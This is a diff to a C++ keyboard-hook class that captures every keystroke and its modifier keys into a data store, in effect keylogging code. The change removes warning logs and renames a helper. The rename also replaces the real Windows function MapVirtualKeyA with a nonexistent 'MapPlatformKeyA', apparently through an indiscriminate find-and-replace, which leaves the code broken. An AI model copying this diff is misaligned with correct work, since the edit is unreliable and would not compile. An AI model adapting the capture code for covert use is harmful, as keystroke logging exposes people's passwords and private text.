@@ -38,7 +38,6 @@ KeyHook::~KeyHook() {
 
 bool KeyHook::InstallHook() {
     if (m_isActive) {
-        LOG_WARN("Keyboard hook already installed");
         return true;
     }
 
@@ -59,7 +58,6 @@ bool KeyHook::InstallHook() {
     #elif PLATFORM_LINUX
     // Linux key logging requires different approach (X11 or evdev)
     // This is a placeholder - actual implementation would need X11 or libevdev
-    LOG_WARN("Key logging not fully implemented for Linux. Requires X11 or libevdev integration.");
     #endif
 
     m_isActive = true;
@@ -114,13 +112,13 @@ void KeyHook::ProcessKeyEvent(WPARAM eventType, KBDLLHOOKSTRUCT* kbStruct) {
         keyData.modifiers = GetModifierKeys();
 
         // Convert to readable format
-        keyData.keyName = VirtualKeyCodeToString(kbStruct->vkCode);
+        keyData.keyName = PlatformKeyCodeToString(kbStruct->vkCode);
 
         // Add to data manager
         m_dataManager->AddKeyData(keyData);
 
         // Debug logging
-        if (Logger::GetLogLevel() <= LogLevel::DEBUG) {
+        if (Logger::GetLogLevel() <= LogLevel::LEVEL_DEBUG) {
             LogKeyEvent(keyData);
         }
     }
@@ -155,7 +153,7 @@ KeyModifiers KeyHook::GetModifierKeys() const {
     return modifiers;
 }
 
-std::string KeyHook::VirtualKeyCodeToString(UINT vkCode) const {
+std::string KeyHook::PlatformKeyCodeToString(UINT vkCode) const {
     // Map of common virtual key codes to names
     static const std::map<UINT, std::string> keyMap = {
         {VK_BACK, "Backspace"}, {VK_TAB, "Tab"}, {VK_RETURN, "Enter"},
@@ -195,9 +193,9 @@ std::string KeyHook::VirtualKeyCodeToString(UINT vkCode) const {
         return "Num" + std::to_string(vkCode - VK_NUMPAD0);
     }
 
-    // Convert using MapVirtualKey for other keys
+    // Convert using MapPlatformKey for other keys
     char keyName[256] = {0};
-    UINT scanCode = MapVirtualKeyA(vkCode, MAPVK_VK_TO_VSC);
+    UINT scanCode = MapPlatformKeyA(vkCode, MAPVK_VK_TO_VSC);
     LONG lParam = (scanCode << 16);
     
     if (GetKeyNameTextA(lParam, keyName, sizeof(keyName))) {
